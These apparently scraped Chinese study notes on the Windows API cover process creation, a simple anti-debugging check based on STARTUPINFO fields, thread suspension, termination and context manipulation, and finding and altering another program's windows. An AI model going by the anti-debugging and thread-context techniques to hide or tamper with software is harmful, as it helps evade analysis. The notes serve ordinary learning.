&#123; HANDLE hProcess; //进程句柄 HANDLE hThread; //线程句柄 DWORD dwProcessId; //进程id DWORD dwThreadId; //线程id&#125; PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION; 很多Win32api不是通过函数返回值来返回成功与否，如果想知道执行不成功的原因，用GetLastError函数来获取问题编号。VS，工具-错误查找，输入编号，得知对应的错误信息 在创建完进程之后需要关闭进程。另外，我们知道每个进程至少有一个线程，所以我们也要关闭线程，使用CloseHandle函数来关闭 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123; TCHAR childProcessName[] = TEXT(&quot;C:/WINDOWS/system32/cmd.exe&quot;); TCHAR childProcessCommandLine[] = TEXT(&quot; /c ping www.baidu.com&quot;); STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(si)); //置0 ZeroMemory(&amp;pi, sizeof(pi)); //置0 si.cb = sizeof(si); //填充该成员，记录结构体大小 if (CreateProcess( childProcessName, //进程名称 childProcessCommandLine, //命令行参数 NULL, //不继承进程句柄 NULL, //不继承线程句柄 FALSE, //不继承句柄 0, //没有创建标志 NULL, //使用父进程环境变量 NULL, //使用父进程目录作为当前目录，可以自己设置目录 &amp;si, //STARTUPINFOW结构体详细信息 &amp;pi) //PROCESS_INFORMATION结构体进程信息 ) &#123; printf(&quot;CreateProcess Successfully! &quot;); &#125; else &#123; printf(&quot;CreateProcess Error: %d &quot;, GetLastError()); &#125; CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 0;&#125; 扩展：反调试(通过STARTUPINFO结构体) 使用CreateProcess创建子进程时要传一个STARTUPINFOW结构体参数，这个参数是由父进程传的。 如果是双击一个程序，这个结构体参数是父进程explorer传的 如果是通过调试器启动一个程序，父进程是调试器，这个结构体参数是父进程调试器传的 那么可以写一个程序，来看父进程创建子进程时传递这个结构体具体的值有什么不同。（部分字段打印） 123456789101112131415161718192021#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; STARTUPINFO si; ZeroMemory(&amp;si, sizeof(STARTUPINFO)); si.cb = sizeof(STARTUPINFO); GetStartupInfo(&amp;si); printf(&quot;%-16s: %lu &quot;, &quot;dwX&quot;, si.dwX); printf(&quot;%-16s: %lu &quot;, &quot;dwY&quot;, si.dwY); printf(&quot;%-16s: %lu &quot;, &quot;dwXSize&quot;, si.dwXSize); printf(&quot;%-16s: %lu &quot;, &quot;dwYSize&quot;, si.dwYSize); printf(&quot;%-16s: %lu &quot;, &quot;dwXCountChars&quot;, si.dwXCountChars); printf(&quot;%-16s: %lu &quot;, &quot;dwYCountChars&quot;, si.dwYCountChars); printf(&quot;%-16s: %lu &quot;, &quot;dwFillAttribute&quot;, si.dwFillAttribute); printf(&quot;%-16s: %lu &quot;, &quot;dwFlags&quot;, si.dwFlags); return 0;&#125; VS编译后单独在exe目录双击执行，和，使用调试器比如OD打开该程序，观察它们的输出 双击执行OD打开执行 发现调试环境下执行程序时的输出字段如下： 12345678dwX : 1dwY : 655360dwXSize : 1689392dwYSize : 8667184dwXCountChars : 10dwYCountChars : 10dwFillAttribute : 1688688dwFlags : 129 换句话说，父进程创建子进程时STARTUPINFOW参数如下时，说明程序处于调试状态。那么我们可以编写一个反调试函数，检查STARTUPINFO结构体的字段是否和上面的一样，如果一样，认为程序正在被调试，则退出程序 1234567891011121314151617181920void CheckDebug() &#123; STARTUPINFO si; ZeroMemory(&amp;si, sizeof(STARTUPINFO)); si.cb = sizeof(STARTUPINFO); GetStartupInfo(&amp;si); // 检查STARTUPINFO的特定字段是否与调试环境中的字段相匹配 if (si.dwX == 1 &amp;&amp; si.dwY == 655360 &amp;&amp; si.dwXSize == 1689392 &amp;&amp; si.dwYSize == 8667184 &amp;&amp; si.dwXCountChars == 10 &amp;&amp; si.dwYCountChars == 10 &amp;&amp; si.dwFillAttribute == 1688688 &amp;&amp; si.dwFlags == 129) &#123; // 在调试环境中运行 exit(1); // 退出程序 &#125;&#125; 试验一下，将下面代码编译然后再用OD打开 123456789101112131415161718192021222324252627282930313233#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void CheckDebug() &#123; STARTUPINFO si; ZeroMemory(&amp;si, sizeof(STARTUPINFO)); si.cb = sizeof(STARTUPINFO); GetStartupInfo(&amp;si); // 检查STARTUPINFO的特定字段是否与调试环境中的字段相匹配 if (si.dwX == 1 &amp;&amp; si.dwY == 655360 &amp;&amp; si.dwXSize == 1689392 &amp;&amp; si.dwYSize == 8667184 &amp;&amp; si.dwXCountChars == 10 &amp;&amp; si.dwYCountChars == 10 &amp;&amp; si.dwFillAttribute == 1688688 &amp;&amp; si.dwFlags == 129) &#123; // 在调试环境中运行 exit(1); // 退出程序 &#125;&#125;int main() &#123; CheckDebug(); // 正常程序逻辑 printf(&quot;程序未处于调试状态。 &quot;); return 0;&#125; hhh，果然这个反调试还是比较低级。那再增加打印输出，看是否是启动参数变了 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void CheckDebug() &#123; STARTUPINFO si; ZeroMemory(&amp;si, sizeof(STARTUPINFO)); si.cb = sizeof(STARTUPINFO); GetStartupInfo(&amp;si); printf(&quot;%-16s: %lu &quot;, &quot;dwX&quot;, si.dwX); printf(&quot;%-16s: %lu &quot;, &quot;dwY&quot;, si.dwY); printf(&quot;%-16s: %lu &quot;, &quot;dwXSize&quot;, si.dwXSize); printf(&quot;%-16s: %lu &quot;, &quot;dwYSize&quot;, si.dwYSize); printf(&quot;%-16s: %lu &quot;, &quot;dwXCountChars&quot;, si.dwXCountChars); printf(&quot;%-16s: %lu &quot;, &quot;dwYCountChars&quot;, si.dwYCountChars); printf(&quot;%-16s: %lu &quot;, &quot;dwFillAttribute&quot;, si.dwFillAttribute); printf(&quot;%-16s: %lu &quot;, &quot;dwFlags&quot;, si.dwFlags); // 检查STARTUPINFO的特定字段是否与调试环境中的字段相匹配 if (si.dwX == 1 &amp;&amp; si.dwY == 655360 &amp;&amp; si.dwXSize == 1689392 &amp;&amp; si.dwYSize == 8667184 &amp;&amp; si.dwXCountChars == 10 &amp;&amp; si.dwYCountChars == 10 &amp;&amp; si.dwFillAttribute == 1688688 &amp;&amp; si.dwFlags == 129) &#123; // 在调试环境中运行 exit(1); // 退出程序 &#125;&#125;int main() &#123; CheckDebug(); // 正常程序逻辑 printf(&quot;程序未处于调试状态。 &quot;); return 0;&#125; 发现只有dwFlags没变，其他字段变了。未来学习反调试是再深入研究"},{"title":"控制线程","path":"/wiki/Windows_API/控制线程.html","content":"挂起和恢复 挂起几次就要恢复几次，suspend count不为0这个线程仍挂起 Each thread has a suspend count (with a maximum value of MAXIMUM_SUSPEND_COUNT). If the suspend count is greater than zero, the thread is suspended; otherwise, the thread is not suspended and is eligible for execution. Calling SuspendThread causes the target thread’s suspend count to be incremented. The ResumeThread function decrements the suspend count of a suspended thread. SuspendThread Suspends the specified thread. 123DWORD SuspendThread( [in] HANDLE hThread); hThread：A handle to the thread that is to be suspended. The handle must have the THREAD_SUSPEND_RESUME access right. ResumeThread Decrements a thread’s suspend count. When the suspend count is decremented to zero, the execution of the thread is resumed. 123DWORD ResumeThread( [in] HANDLE hThread); hThread：A handle to the thread to be restarted. This handle must have the THREAD_SUSPEND_RESUME access right. 即使线程的挂起计数器（suspend count）减为0后，线程也不是立即恢复执行，要看调度程序是否给这个线程分CPU时间。 Windows操作系统的内核是不可抢占的，即在执行内核代码时，不能被中断。它不是一个实时操作系统(RTOS)，无法保证线程在ResumeThread被调用后立即获得CPU时间。因此，不要抱有能精确控制线程执行时间点的这种期望。 不可抢占的、非实时操作系统通常在执行内核功能时是不可中断的。 终止线程 有三种方式可以终止线程： 线程函数里return，函数结束执行 使用ExitThread函数 使用TerminateThread函数 退出码用于让程序其他地方知道该线程因什么原因退出，是正常结束，还是其他原因结束。退出码来源： 线程函数中return的值 ExitThread传参给的退出码 TerminateThread传参给的退出码 退出码能在IDE的输出窗口中看到：线程xxx已退出，返回值为xx（这个就是退出码） 线程函数里return 线程函数结束调用。return返回的值即为退出码 123456DWORD WINAPI ThreadProc(LPVOID lpParam) &#123;\t//... return 0; //函数调用结束，return的值是退出码&#125; ExitThread ExitThread是在线程函数内部中调用。 123void ExitThread( [in] DWORD dwExitCode); 常见的用法，在线程函数外用一个标志（Flag）来控制这个线程是否停止。 例1234567891011121314151617181920BOOL bFlag=FALSE; //控制线程是否退出DWORD WINAPI ThreadProc(LPVOID lpParam) &#123;\t//... while()\t&#123; //...执行功能 if(bFlag) //根据外部Flag的状态选择是否退出线程 &#123; ::ExitThread(1); //传递退出码 &#125;\t&#125; //... return 0;&#125; TerminateThread TerminateThread在线程函数外部调用。TerminateThread是告诉操作系统说我要结束这个线程（异步调用）。 1234BOOL TerminateThread( [in, out] HANDLE hThread, [in] DWORD dwExitCode); 示例123HANDLE hThread = CreateThread(...);TerminateThread(hThread, 3); ExitThread VS TerminateThread 是否清理堆栈 调用方式 ExitThread 清理 同步调用 TerminateThread 不清理 异步调用 是否清理线程的堆栈 ExitThread：会将线程使用到的堆栈释放掉（线程开始运行时用到的堆栈中的所有内容）。这可能会导致资源泄露，因为在线程函数中申请的资源可能没有机会释放。假如在线程函数中申请了资源，执行ExitThread后，申请的那些资源就没机会做释放了。 因此推荐让线程函数正常结束调用，正常返回，自己就能在函数结束前将资源释放掉。 示例 例1例2例1：在线程函数中实例化一个对象，ExitThread后这个对象的析构不会被调用。12345678910111213141516171819202122232425262728293031323334353637#include &lt;windows.h&gt;#include &lt;iostream&gt;class MyClass &#123;public: MyClass() &#123; std::cout &lt;&lt; &quot;MyClass Constructor&quot; &lt;&lt; std::endl; &#125; ~MyClass() &#123; std::cout &lt;&lt; &quot;MyClass Destructor&quot; &lt;&lt; std::endl; &#125;&#125;;DWORD WINAPI ThreadProc(LPVOID lpParam)&#123; MyClass obj; // 创建对象 // 执行一些操作 std::cout &lt;&lt; &quot;Thread running...&quot; &lt;&lt; std::endl; // 使用 ExitThread 终止线程 ExitThread(1); // 由于 ExitThread 的调用，下面的代码不会被执行 // 并且 MyClass 的析构函数不会被调用 return 0; // 这行代码永远不会被执行&#125;int main()&#123; HANDLE hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); return 0;&#125;例2：在线程函数中动态分配一块内存。ExitThread后这块内存不会被释放，导致内存泄漏。12345678910111213141516171819202122232425262728#include &lt;windows.h&gt;#include &lt;iostream&gt;DWORD WINAPI ThreadProc(LPVOID lpParam)&#123; int* p = new int(5); // 动态分配内存并初始化为5 // 执行一些操作 std::cout &lt;&lt; &quot;Thread running...&quot; &lt;&lt; std::endl; // 使用 ExitThread 终止线程 ExitThread(1); // 由于 ExitThread 的调用，下面的代码不会被执行 // 并且动态分配的内存不会被释放 delete p; // 这行代码永远不会被执行 return 0; // 这行代码永远不会被执行&#125;int main()&#123; HANDLE hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); return 0;&#125; TerminateThread：不会清理堆栈。微软就是这么设计的，考虑这么一个场景，如果将一个线程的堆栈清理了，假设还有其他线程在使用这个堆栈中的值，那就会出错，这种错误通常难以调试。（因为TerminateThread是从外部终止线程，而不是线程自行终止，所以在设计上不释放线程的堆栈） 同步调用和异步调用 ExitThread是同步调用，TerminateThread是异步调用。 ExitThread：同步调用 程序执行到B时，说明ExitThread一定是执行完了的，即线程已经结束了 12345//... AExitThread(); //结束线程//... B（此时ExitThread已执行完毕） TerminateThread：异步调用 程序执行到B时，TerminateThread不一定执行完毕，即不确定线程是否已经结束。因为TerminateThread是异步调用，它会新起一个线程去终止目标线程，而我们的代码在调用TerminateThread后会立即继续执行到B。 就是一个异步操作，触发了一个并行的分支，当前分支不知道另外一个分支是否执行完毕 12345//... ATerminateThread(hThread,3); //结束线程//... B（不确定TreminateThread执行完毕，即线程是否被终止是不确定的） 如果B处的代码需要在线程已经关闭的前提下执行，上面的代码就会有问题。为确保线程已经终止，用WaitForSingObject函数等待线程结束，确保线程已终止。 123456//... ATerminateThread(hThread, 3); //结束线程WaitForSingleObject(hThread, INFINITE);\t//确保线程结束//... B(此时线程已确定终止) 等待线程结束 WaitForSingleObject 等待一个内核对象执行，特定对象处于已通知状态(in the signaled state)或等的时间等够了就结束等待。 Waits until the specified object is in the signaled state or the time-out interval elapses. 1234DWORD WaitForSingleObject( [in] HANDLE hHandle, // handle to object 句柄 [in] DWORD dwMilliseconds // time-out interval 等待超时时间（毫秒）); [in] hHandle：A handle to the object. For a list of the object types whose handles can be specified, see the following Remarks section. If this handle is closed while the wait is still pending, the function’s behavior is undefined. The handle must have the SYNCHRONIZE access right. [in] dwMilliseconds：The time-out interval, in milliseconds. If a nonzero value is specified, the function waits until the object is signaled or the interval elapses. If dwMilliseconds is zero, the function does not enter a wait state if the object is not signaled; it always returns immediately. If dwMilliseconds is INFINITE, the function will return only when the object is signaled.INFINITE：无限等待 WaitForMultipleObjects Waits until one or all of the specified objects are in the signaled state or the time-out interval elapses. 123456DWORD WaitForMultipleObjects( [in] DWORD nCount, // number of handles in array 内核对象的数量 [in] const HANDLE *lpHandles, // object-handle array 内核对象的句柄数组 [in] BOOL bWaitAll, // wait option 等待模式 [in] DWORD dwMilliseconds // time-out interval 等待超时时间（毫秒）); [in] nCount:The number of object handles in the array pointed to by lpHandles. [in] lpHandles：An array of object handles. [in] bWaitAll TRUE：等待所有对象的状态发生变更 FALSE：等待任一对象的状态发生变更 In the latter case, the return value indicates the object whose state caused the function to return. [in] dwMilliseconds：The time-out interval, in milliseconds. GetExitCodeThread Retrieves the termination status of the specified thread. 开发者可以根据业务需要，用返回值表示线程函数的执行情况。比如一个线程函数的功能是：写一个文件到磁盘上，成功返回1，失败返回0。 1234567891011DWORD WINAPI ThreadProc(LPVOID lpParameter) &#123; // 线程执行的代码 for (int i = 0; i &lt; 100; i++) &#123; Sleep(500); printf(&quot;Thread: %d &quot;, i); &#125; return 0;&#125; 用GetExitCodeThread函数获得这个返回值 1234BOOL GetExitCodeThread( [in] HANDLE hThread, // handle to the thread [out] LPDWORD lpExitCode // termination status); 例123456789101112131415161718192021222324252627282930313233343536373839#include &lt;windows.h&gt;#include &lt;stdio.h&gt;DWORD WINAPI ThreadProc(LPVOID lpParameter) &#123; // 线程执行的代码 for (int i = 0; i &lt; 100; i++) &#123; Sleep(50); printf(&quot;Thread: %d &quot;, i); &#125; return 0;&#125;int main(int argc, char* argv[]) &#123; HANDLE hThread; // 创建线程，不接收返回值 hThread=CreateThread( NULL, // lpThreadAttributes, 线程安全属性，NULL表示默认安全级别 0, // dwStackSize, 线程堆栈大小，0表示默认大小 ThreadProc, // lpStartAddress, 线程函数的指针 NULL, // lpParameter, 传递给线程函数的参数 0, // dwCreationFlags, 线程创建标志，0表示线程立即运行 NULL // lpThreadId, 返回线程ID的指针，NULL表示不需要 ); WaitForSingleObject(hThread, INFINITE); //在这里阻塞 //要不线程函数还没执行完，就GetExitCodeThread获取ExitCode，此时获取到的ExitCode是乱的 DWORD exitCode; GetExitCodeThread(hThread, &amp;exitCode); printf(&quot;Exit Code: %d &quot;, exitCode); // 保持等待，防止控制台退出 getchar(); return 0;&#125; 设置、获取线程上下文 引言 在Windows系统中，CPU的时间片通常为20ms。当线程A的时间片耗尽后，CPU会切换到线程B执行。线程B的时间片耗尽后，CPU再切回到线程A执行。用OD调试过程序就会知道，每行指令的执行都会用到一堆寄存器。当从线程A切换到线程B时，系统需要保存线程A的寄存器状态，并在切回到线程A时恢复这些寄存器值。CONTEXT 结构用于保存和恢复这些寄存器的状态，以确保线程的执行环境在上下文切换时能够正确恢复。 CONTEXT结构 就是常说的线程上下文 1[in, out] lpContext A pointer to a CONTEXT structure (such as ARM64_NT_CONTEXT) that receives the appropriate context of the specified thread.The value of the ContextFlags member of this structure specifies which portions of a thread’s context are retrieved.The CONTEXT structure is highly processor specific. Refer to the WinNT.h header file for processor-specific definitions of this structures and any alignment requirements.CONTEXT字段和具体处理器高度相关，所以要在具体的编译环境中的WinNT.h头文件中去看，在头文件中CONTEXT定义的注释中可以看到ContextFlags有哪些字段供选择。 VC++下12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485typedef struct _CONTEXT &#123; // // The flags values within this flag control the contents of // a CONTEXT record. // // If the context record is used as an input parameter, then // for each portion of the context record controlled by a flag // whose value is set, it is assumed that that portion of the // context record contains valid context. If the context record // is being used to modify a threads context, then only that // portion of the threads context will be modified. // // If the context record is used as an IN OUT parameter to capture // the context of a thread, then only those portions of the thread&#x27;s // context corresponding to set flags will be returned. // // The context record is never used as an OUT only parameter. // DWORD ContextFlags; // // This section is specified/returned if CONTEXT_DEBUG_REGISTERS is // set in ContextFlags. Note that CONTEXT_DEBUG_REGISTERS is NOT // included in CONTEXT_FULL. // DWORD Dr0; DWORD Dr1; DWORD Dr2; DWORD Dr3; DWORD Dr6; DWORD Dr7; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_FLOATING_POINT. // FLOATING_SAVE_AREA FloatSave; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_SEGMENTS. // DWORD SegGs; DWORD SegFs; DWORD SegEs; DWORD SegDs; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_INTEGER. // DWORD Edi; DWORD Esi; DWORD Ebx; DWORD Edx; DWORD Ecx; DWORD Eax; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_CONTROL. // DWORD Ebp; DWORD Eip; DWORD SegCs; // MUST BE SANITIZED DWORD EFlags; // MUST BE SANITIZED DWORD Esp; DWORD SegSs; // // This section is specified/returned if the ContextFlags word // contains the flag CONTEXT_EXTENDED_REGISTERS. // The format and contexts are processor specific // BYTE ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];&#125; CONTEXT; 由于CONTEXT结构体成员太多了, 其成员ContextFlags用于指定要获取或设置哪些部分的上下文。常用的值包括： CONTEXT_DEBUG_REGISTERS: 获取或设置调试寄存器。（Note that CONTEXT_DEBUG_REGISTERS is NOT included in CONTEXT_FULL.） CONTEXT_FLOATING_POINT: 获取或设置浮点寄存器 CONTEXT_SEGMENTS: 包含数据段寄存器DS、源段寄存器SS、堆栈段寄存器SS和附加段寄存器ES、FS和GS。 CONTEXT_INTEGER: 获取或设置整数寄存器（如 EAX, EBX, ECX, EDX 在 x86 架构上） CONTEXT_CONTROL: 只获取或设置控制寄存器（如 EIP, ESP, EBP 在 x86 架构上）。 CONTEXT_FULL: 获取或设置所有的寄存器。、 可以用|进行组合，如 CONTEXT_INTEGER | CONTEXT_CONTROL 可以通过GetThreadContext和SetThreadContext函数来获取和设置线程上下文。 使用GetThreadContext获取前必须先挂起进程，如果是执行中的线程，虽然可以获取成功，但这个context并不是有效的，因为这个context是执行GetThreadContext的那一瞬间得到的，获取后线程还在跑，context可能发生了变化。 GetThreadContext Retrieves the context of the specified thread. 1234BOOL GetThreadContext( [in] HANDLE hThread, // handle to thread [in, out] LPCONTEXT lpContext // context structure); SetThreadContext Sets the context for the specified thread. 1234BOOL SetThreadContext( [in] HANDLE hThread, // handle to thread [in] const CONTEXT *lpContext // context structure); 例 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;windows.h&gt;#include &lt;stdio.h&gt;DWORD WINAPI ThreadProc(LPVOID lpParameter) &#123; // 线程执行的代码 for (int i = 0; i &lt; 100; i++) &#123; Sleep(50); printf(&quot;Thread: %d &quot;, i); &#125; return 0;&#125;int main(int argc, char* argv[]) &#123; HANDLE hThread; // 创建线程，不接收返回值 hThread=CreateThread( NULL, // lpThreadAttributes, 线程安全属性，NULL表示默认安全级别 0, // dwStackSize, 线程堆栈大小，0表示默认大小 ThreadProc, // lpStartAddress, 线程函数的指针 NULL, // lpParameter, 传递给线程函数的参数 0, // dwCreationFlags, 线程创建标志，0表示线程立即运行 NULL // lpThreadId, 返回线程ID的指针，NULL表示不需要 ); SuspendThread(hThread); CONTEXT c; c.ContextFlags = CONTEXT_INTEGER; //获取context中哪些部分 GetThreadContext(hThread, &amp;c); //获取线程上下文 CONTEXT c1; c1.ContextFlags = CONTEXT_INTEGER; c1.Eax = 0x123; SetThreadContext(hThread, &amp;c1); //设置线程上下文 //再次GetThreadContext，然后打印输出 return 0;&#125;"},{"title":"枚举窗口与模拟鼠标和模拟键盘","path":"/wiki/Windows_API/枚举窗口与模拟鼠标和模拟键盘.html","content":"查找窗口 FindWindowA查找窗口类名为lpClassName，窗口标题名为lpWindowName的top-level window窗口。 1234HWND FindWindowA( [in, optional] LPCSTR lpClassName, // class name 窗口类名 [in, optional] LPCSTR lpWindowName // window name 窗口标题名); 不同参数情况下的行为两个参数都为空第一个参数为空第二个参数为空1HWND hwnd = FindWindow(NULL, NULL);函数返回NULL，因为没有足够的信息来查找任何窗口。1HWND hwnd = FindWindow(NULL, &quot;Window Title&quot;);该函数将查找标题为 “Window Title” 的窗口。它会返回第一个匹配该标题的窗口句柄。1HWND hwnd = FindWindow(&quot;ClassName&quot;, NULL);该函数将查找类名为 “ClassName” 的窗口。它会返回第一个匹配该类名的窗口句柄。 以fg为例，用VS的spy++找到fg主窗口的类名和标题名，然后用上面这个api来查找该窗口 spy++找到了fg主窗口的句柄，窗口句柄是全局的，能在代码中直接用。但fg可能关闭后再重新打开，那fg的窗口句柄会变。所以用FindWindow以窗口类和窗口标题来得到窗口句柄找就比较稳 12345678910111213141516171819202122#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; // 窗口类名和窗口标题 const char* className = &quot;#32770&quot;; const char* windowTitle = &quot;飞鸽传书 IP Messenger&quot;; // 查找窗口 HWND hwnd = FindWindowA(className, windowTitle); if (hwnd != NULL) &#123; printf(&quot;找到窗口，窗口句柄值为: %p &quot;, hwnd); &#125; else &#123; printf(&quot;未找到窗口 &quot;); &#125; return 0;&#125; 运行输出1找到窗口，窗口句柄值为: 000409A0 找到窗口后我们做些事 用SendMessage发WM_CLOSE消息来实现关闭窗口 123456LRESULT SendMessage( [in] HWND hWnd, // handle to destination window [in] UINT Msg, // message WPARAM wParam [in] WPARAM wParam, // first message parameter [in] LPARAM lParam // second message parameter); 切换到这个窗口 SwitchToThisWindow 函数会将指定的窗口带到前台，并将键盘焦点设置到该窗口上。 1234void SwitchToThisWindow( [in] HWND hwnd, //要切换到的窗口的句柄 [in] BOOL fUnknown); fUnknown 如果为 TRUE，则窗口被切换时模拟按下 ALT+TAB 键； 如果为 FALSE，则只是简单地切换到窗口而不模拟按键 SwitchToThisWindow在 Windows 7 及更高版本中已经被标记为不推荐使用，对于较新的 Windows 版本，可以考虑使用 SetForegroundWindow 或者结合 AttachThreadInput 函数来实现类似的效果 12345678910111213141516171819202122232425262728293031323334353637#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; // 窗口类名和窗口标题 const char* className = &quot;#32770&quot;; const char* windowTitle = &quot;飞鸽传书 IP Messenger&quot;; // 查找窗口 HWND hwnd = FindWindowA(className, windowTitle); // 判断是否找到窗口 if (hwnd == NULL) &#123; printf(&quot;未找到窗口 &quot;); return 1; &#125; // 找到窗口，打印句柄值 printf(&quot;找到窗口，窗口句柄值为: %p &quot;, hwnd); // 修改窗口标题 const char* newWindowTitle = &quot;新标题 - 飞鸽传书&quot;; SetWindowTextA(hwnd, newWindowTitle); // 切换到该窗口 SwitchToThisWindow(hwnd, TRUE); // 睡眠3秒 Sleep(3000); // 发送WM_CLOSE消息关闭窗口 SendMessage(hwnd, WM_CLOSE, 0, 0); return 0;&#125; 运行后，fg主窗口标题被修改为“新标题 - 飞鸽传书”，执行SwitchToThisWindow后fg窗口被切换出来，睡眠3s后，fg窗口被关闭 查找子窗口 假设我们要找fg中的编辑框子窗口 方法一：FindWindowExA方法二：GetDlgItem123456HWND FindWindowExA( [in, optional] HWND hWndParent, // handle to parent window [in, optional] HWND hWndChildAfter, // handle to child window [in, optional] LPCSTR lpszClass, // class name [in, optional] LPCSTR lpszWindow // window name); 1234567891011121314151617181920212223242526272829303132333435#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; // 父窗口类名和标题 const char* className = &quot;#32770&quot;; const char* windowTitle = &quot;飞鸽传书 IP Messenger&quot;; // 查找父窗口 HWND hwndParent = FindWindow(className, windowTitle); if (hwndParent == NULL) &#123; printf(&quot;未找到父窗口 &quot;); return 1; &#125; // 查找子窗口 (Edit 控件) HWND hwndEdit = FindWindowEx(hwndParent, NULL, &quot;Edit&quot;, NULL); if (hwndEdit == NULL) &#123; printf(&quot;未找到子窗口 &quot;); return 1; &#125; // 设置子窗口的标题 SetWindowText(hwndEdit, &quot;新标题 - Edit 控件&quot;); // 发送消息修改子窗口中的内容 SendMessage(hwndEdit, WM_SETTEXT, 0, (LPARAM)&quot;这是新的内容&quot;); printf(&quot;已修改子窗口内容 &quot;); return 0;&#125; 执行后Edit控件的标题会被修改为&quot;新标题 - Edit 控件&quot;，执行SendMessage后Edit控件中的内容会多出“这是新的内容” 执行SetWindowText后Edit控件的标题会被修改；但没试成功，反而对上面那个SysListView32改标题就成功了。 而且设置Edit内容后，spy++上反而显示标题改了 后面有需要再深入看下，先这样spy++上定位到fg主窗口，然后会显示fg中所有子控件，选择Edit控件，右键属性可以看到控件ID。然后我们就可以用GetDlgItem获得这个控件的窗口句柄 如果一个程序中有很多个Edit控件，也都没有标题，用FindWindowEx会找到一堆窗口句柄，怎么知道哪个是哪个？就可以用上面的这个方法得知 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; // 父窗口类名和标题 const char* className = &quot;#32770&quot;; const char* windowTitle = &quot;飞鸽传书 IP Messenger&quot;; // 查找父窗口 HWND hwndParent = FindWindow(className, windowTitle); if (hwndParent == NULL) &#123; printf(&quot;未找到父窗口 &quot;); return 1; &#125; // Edit 控件的 ID const int editID = 0x3E9; // 查找子窗口 (Edit 控件) HWND hwndEdit = GetDlgItem(hwndParent, editID); if (hwndEdit == NULL) &#123; printf(&quot;未找到子窗口 &quot;); return 1; &#125; // 设置子窗口的标题 SetWindowText(hwndEdit, &quot;新标题 - Edit 控件&quot;); //获取内容 //TCHAR szTitle[MAX_PATH] = &#123; 0 &#125;; //SendMessage(hEdit, WM_GETTEXT, MAX_PATH, (LPARAM)szTitle); // 发送消息修改子窗口内容 SendMessage(hwndEdit, WM_SETTEXT, 0, (LPARAM)&quot;这是新的内容&quot;); return 0;&#125; 枚举子窗口控件 EnumChildWindows用于枚举指定父窗口的所有子窗口。每找到一个子窗口就会调用一次回调函数。 在回调函数中，返回TRUE表示继续枚举子窗口，返回FALSE表示停止枚举子窗口 12345BOOL EnumChildWindows( [in, optional] HWND hWndParent, // handle to parent window [in] WNDENUMPROC lpEnumFunc, // callback function [in] LPARAM lParam // application-defined value); 参数hWndParent：要枚举其子窗口的父窗口句柄。如果此参数为 NULL，则函数会枚举所有顶层窗口。 参数lpEnumFunc：回调函数 参数lParam：传递给回调函数的应用程序定义值 1234567891011121314151617181920212223242526272829303132333435#include &lt;windows.h&gt;#include &lt;stdio.h&gt;// 回调函数，用于枚举子窗口BOOL CALLBACK EnumChildProc(HWND hwndChild, LPARAM lParam)&#123; char windowText[256]; // 获取子窗口的标题 GetWindowTextA(hwndChild, windowText, sizeof(windowText)); // 打印子窗口句柄和标题 printf(&quot;子窗口句柄: %p, 标题: %s &quot;, hwndChild, windowText); return TRUE; // 返回 TRUE 以继续枚举子窗口&#125;int main()&#123; // 父窗口类名和标题 const char* className = &quot;#32770&quot;; const char* windowTitle = &quot;飞鸽传书 IP Messenger&quot;; // 查找父窗口 HWND hwndParent = FindWindowA(className, windowTitle); if (hwndParent == NULL) &#123; printf(&quot;未找到父窗口 &quot;); return 1; &#125; // 枚举子窗口 EnumChildWindows(hwndParent, EnumChildProc, 0); return 0;&#125; 运行输出1234567891011子窗口句柄: 022E0BB4, 标题:子窗口句柄: 006E1124, 标题: 发送(&amp;S)子窗口句柄: 00101126, 标题: 封装(&amp;E)子窗口句柄: 00210F00, 标题: 上锁(&amp;K)子窗口句柄: 00281134, 标题: 刷新(&amp;R)子窗口句柄: 0010113E, 标题: 在线用户1子窗口句柄: 00351278, 标题:子窗口句柄: 002107F6, 标题: List1子窗口句柄: 00140ECC, 标题:子窗口句柄: 002F0D08, 标题: ipmsg.exe(100KB) 枚举所有打开的窗口 用EnumWindows枚举系统上已打开的所有顶层窗口（top-level windows ），每找到一个窗口就会调用一次回调函数。 在回调函数中，返回TRUE表示继续枚举窗口，返回FALSE表示停止枚举窗口。 1234BOOL EnumWindows( [in] WNDENUMPROC lpEnumFunc, // callback function 回调函数 [in] LPARAM lParam // application-defined value); 123456789101112131415161718192021222324252627282930#include &lt;windows.h&gt;#include &lt;stdio.h&gt;// 回调函数，用于枚举顶层窗口BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)&#123; char windowText[256]; // 获取窗口的标题 GetWindowTextA(hwnd, windowText, sizeof(windowText)); // 打印窗口句柄和标题 printf(&quot;窗口句柄: %p, 标题: %s &quot;, hwnd, windowText); // 比较窗口标题 if (strcmp(windowText, &quot;飞鸽传书 IP Messenger&quot;) == 0) &#123; printf(&quot;找到目标窗口 &quot;); return FALSE; // 返回 FALSE 停止枚举 &#125; return TRUE; // 返回 TRUE 继续枚举&#125;int main()&#123; // 枚举所有顶层窗口（top-level windows ） EnumWindows(EnumWindowsProc, 0); return 0;&#125; 模拟鼠标点击 